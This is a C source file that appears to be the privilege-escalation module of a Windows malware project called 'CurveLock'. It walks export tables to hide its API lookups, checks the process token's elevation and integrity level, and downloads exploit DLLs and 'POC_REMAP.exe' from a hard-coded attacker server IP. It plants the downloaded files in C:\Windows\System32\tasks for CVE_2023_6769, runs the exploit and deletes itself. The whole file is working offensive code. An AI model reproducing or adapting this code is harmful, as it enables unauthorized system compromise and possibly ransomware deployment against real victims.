#include <windows.h>
#include <stdio.h>
#include "common.h"
#include "Structs.h"
#include <Wininet.h>
#pragma comment(lib, "wininet.lib")
#include <stdlib.h>

// GetProcAddress replacement function
FARPROC GetProcAddressQ(IN HMODULE hModule, IN LPCSTR lpApiName) {

	PBYTE pBase = (PBYTE)hModule;

	// Getting the dos header and doing a signature check
	PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// Getting the nt headers and doing a signature check
	PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// Getting the optional header
	IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

	// Getting the image export table
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// Getting the function's names array pointer
	PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);

	// Getting the function's addresses array pointer
	PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);

	// Getting the function's ordinal array pointer
	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


	// Looping through all the exported functions
	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

		// Getting the name of the function
		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

		// Getting the address of the function through its ordinal
		PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Searching for the function specified
		if (strcmp(lpApiName, pFunctionName) == 0) {
			printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
			return pFunctionAddress;
		}
	}

	return NULL;
}

// Function to check if Process is running as admin
BOOL IsTokenElevated(IN HANDLE hToken) {

	NTSTATUS                    STATUS = 0x00;
	TOKEN_ELEVATION             TknElvtion = { 0 };
	DWORD                       dwLength = sizeof(TOKEN_ELEVATION);
	fnNtQueryInformationToken   pNtQueryInformationToken = NULL;
	BOOL                        bTokenIsElevated = FALSE;

	// Checking if the token is valid
	if (!hToken)
		return FALSE;

	// Getting the NtQueryInformationToken function pointer
	if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddressQ(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	// Querying the token elevation
	if ((STATUS = pNtQueryInformationToken(hToken, TokenElevation, &TknElvtion, dwLength, &dwLength)) == 0x00)
		bTokenIsElevated = TknElvtion.TokenIsElevated;

	// Returning the result
	return bTokenIsElevated;
}

// Function that gets the current process token
HANDLE GetCurrentToken() {

	HANDLE                  hToken = NULL;
	NTSTATUS                STATUS = 0x00;
	fnNtOpenProcessToken    pNtOpenProcessToken = NULL;

	// Getting the NtOpenProcessToken function pointer
	if (!(pNtOpenProcessToken = (fnNtOpenProcessToken)GetProcAddressQ(GetModuleHandle(TEXT("NTDLL")), "NtOpenProcessToken"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return NULL;
	}

	// Trying to open the process token
	if ((STATUS = pNtOpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken)) != 0x00) {
		printf("[!] NtOpenProcessToken Failed With Error: 0x%0.8X \n", STATUS);
		hToken = NULL;
	}

	printf("[+] Current Process Token Retrieved \n");

	// Returning the token
	return hToken;
}

// Function that gets the current process integrity level
DWORD QueryTokenIntegrity(IN HANDLE hToken) {

	NTSTATUS                    STATUS = 0x00;
	PTOKEN_MANDATORY_LABEL      pTokenLabel = NULL;
	ULONG                       uReturnLength = 0x00,
		                        uSidCount = 0x00;
	DWORD                       dwIntegrity = THREAD_INTEGRITY_UNKNOWN;
	fnNtQueryInformationToken   pNtQueryInformationToken = NULL;
	fnRtlSubAuthorityCountSid   pRtlSubAuthorityCountSid = NULL;
	fnRtlSubAuthoritySid        pRtlSubAuthoritySid = NULL;

	// Checking if the token is valid
	if (!hToken)
		return FALSE;

	// Getting the NtQueryInformationToken function pointer
	if (!(pNtQueryInformationToken = (fnNtQueryInformationToken)GetProcAddressQ(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationToken"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	// Getting the RtlSubAuthorityCountSid function pointer
	if (!(pRtlSubAuthorityCountSid = (fnRtlSubAuthorityCountSid)GetProcAddressQ(GetModuleHandle(TEXT("NTDLL")), "RtlSubAuthorityCountSid"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	// Getting the RtlSubAuthoritySid function pointer
	if (!(pRtlSubAuthoritySid = (fnRtlSubAuthoritySid)GetProcAddressQ(GetModuleHandle(TEXT("NTDLL")), "RtlSubAuthoritySid"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	// Querying the token integrity level
	if ((STATUS = pNtQueryInformationToken(hToken, TokenIntegrityLevel, NULL, 0x00, &uReturnLength)) != STATUS_SUCCESS && STATUS != STATUS_BUFFER_TOO_SMALL) {
		printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	// Allocating memory for the token label
	if (!(pTokenLabel = LocalAlloc(LPTR, uReturnLength))) {
		printf("[!] LocalAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Querying the token integrity level
	if ((STATUS = pNtQueryInformationToken(hToken, TokenIntegrityLevel, pTokenLabel, uReturnLength, &uReturnLength)) != STATUS_SUCCESS) {
		printf("[!] NtQueryInformationToken [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	// Getting the integrity level
	uSidCount = (*pRtlSubAuthorityCountSid(pTokenLabel->Label.Sid)) - 1;

	// Checking the integrity level
	if ((dwIntegrity = *pRtlSubAuthoritySid(pTokenLabel->Label.Sid, uSidCount))) {

		// Converting the integrity level to a more readable format
		if (dwIntegrity < SECURITY_MANDATORY_LOW_RID) {
			dwIntegrity = THREAD_INTEGRITY_UNKNOWN;
		    printf("[i] Process Token is at an Unknown Integrity Level\n");
		}

		if (dwIntegrity < SECURITY_MANDATORY_MEDIUM_RID){
			dwIntegrity = THREAD_INTEGRITY_LOW;
			printf("[i] Process Token is at a Low Integrity Level\n");
		}

		if (dwIntegrity >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrity < SECURITY_MANDATORY_HIGH_RID) {
			dwIntegrity = THREAD_INTEGRITY_MEDIUM;
			printf("[i] Process Token is at a Medium Integrity Level\n");
		}

		if (dwIntegrity >= SECURITY_MANDATORY_HIGH_RID) {
			dwIntegrity = THREAD_INTEGRITY_HIGH;
			printf("[i] Process Token is at a High Integrity Level\n");
		}
	}

	// Returning the integrity level
	return dwIntegrity;

_END_OF_FUNC:
	if (pTokenLabel)
		LocalFree(pTokenLabel);
}

// Function To Define Download Function
BOOL DownloadFile(LPCSTR url, LPCSTR localFile) {
	HINTERNET hInternet = InternetOpenA("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) {
		printf("[!] InternetOpenA Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hUrl) {
		printf("[!] InternetOpenUrlA Failed With Error: %d \n", GetLastError());
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	HANDLE hFile = CreateFileA(localFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		return FALSE;
	}

	BYTE buffer[4096];
	DWORD bytesRead, bytesWritten;
	BOOL bResult;
	do {
		bResult = InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead);
		if (!bResult) {
			printf("[!] InternetReadFile Failed With Error: %d \n", GetLastError());
			CloseHandle(hFile);
			InternetCloseHandle(hUrl);
			InternetCloseHandle(hInternet);
			return FALSE;
		}
		if (bytesRead == 0) break; // End of file
		WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
	} while (bResult && bytesRead > 0);

	CloseHandle(hFile);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	return TRUE;
}

// Download Specific Files
void DownloadFilesForCVE() {
	const char* baseUrl = "http://192.168.206.8/"; // Change as per attacker server ip
	const char* files[] = {
		"imm32.dll",
		"TAPI32.Manifest",
		"MsCtfMonitor.dll",
		"POC_REMAP.exe"
	};
	const char* localFiles[] = {
		"imm32.dll",
		"TAPI32.Manifest",
		"MsCtfMonitor.dll",
		"POC_REMAP.exe"
	};

	for (int i = 0; i < sizeof(files) / sizeof(files[0]); i++) {
		char url[256];
		snprintf(url, sizeof(url), "%s%s", baseUrl, files[i]);
		if (DownloadFile(url, localFiles[i])) {
			printf("[+] Downloaded %s successfully.\n", files[i]);
		}
		else {
			printf("[!] Failed to download %s.\n", files[i]);
		}
	}
}

// Copy Functions for CVE_2023_6769
BOOL CopyFileToDestination(LPCSTR sourceFile, LPCSTR destinationFile) {
	if (CopyFileA(sourceFile, destinationFile, FALSE)) {
		printf("[+] Successfully copied %s to %s\n", sourceFile, destinationFile);
		return TRUE;
	}
	else {
		printf("[!] Failed to copy %s to %s. Error: %d\n", sourceFile, destinationFile, GetLastError());
		return FALSE;
	}
}
void CopyFiles() {
	const char* sourceFiles[] = {
		"imm32.dll",
		"TAPI32.manifest",
		"CurveLock.exe"
	};
	const char* destinationPath = "C:\\Windows\\System32\\tasks\\";

	for (int i = 0; i < sizeof(sourceFiles) / sizeof(sourceFiles[0]); i++) {
		char destinationFile[256];
		snprintf(destinationFile, sizeof(destinationFile), "%s%s", destinationPath, sourceFiles[i]);
		CopyFileToDestination(sourceFiles[i], destinationFile);
	}
}

// Function that escalates the current process privileges
BOOL DoPrivilegeEscalation() {
	
	printf("[i] Checking For Privilege Escalation \n");

	// Getting Current Token
	HANDLE hToken = GetCurrentToken();

	//Checking if the current process is running as admin
	if (IsTokenElevated(hToken)) {
		printf("[+] Process is already running as admin\n");
		return TRUE;
	}

	else {
		printf("[i] Process is not running as admin\n");
		printf("[i] Trying To Escalate Privileges \n");

		// Checking the integrity level of the token
		printf("[i] Getting The Process Token Integrity Level. Higher the Level The Better\n");
		DWORD dwIntegrity = QueryTokenIntegrity(hToken);
		printf("[i] Current Process Integrity Level : %d \n", dwIntegrity);

		// Checking if the integrity level is not high
		if (dwIntegrity != THREAD_INTEGRITY_HIGH) {
			printf("[i] Process is not running at High Integrity Level. Patching It\n");
			
			// Downloading the required files
			DownloadFilesForCVE();

			// Copy CVE Files to C:\\Windows\\System32\\tasks
			CopyFiles();

			// Execute POC_REMAP.exe
			const char* command = "POC_REMAP.exe";
			int result = system(command);
			if (result == 0) {
				printf("[+] Successfully executed %s\n", command);
				DeleteSelf();
				exit(0); // Exit the Program
			}
			else {
				printf("[!] Failed to execute %s\n", command);
				printf("[!] Continuing CurveLock with an Unprivileged Context\n");
			}
		}
	}


}